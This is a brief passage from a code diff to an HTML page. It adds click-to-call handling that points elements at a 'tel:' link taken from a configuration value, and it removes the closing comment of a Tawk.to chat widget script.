+        window.location.href = 'tel:' + cfg.tel;
+      });
+    } else {
+      // If it's an <a> or anything else → set href
+      el.setAttribute('href', 'tel:' + cfg.tel);
+    }
+  });
 })();
 </script>
-<!--End of Tawk.to Script-->
 </body>
+
 </html>
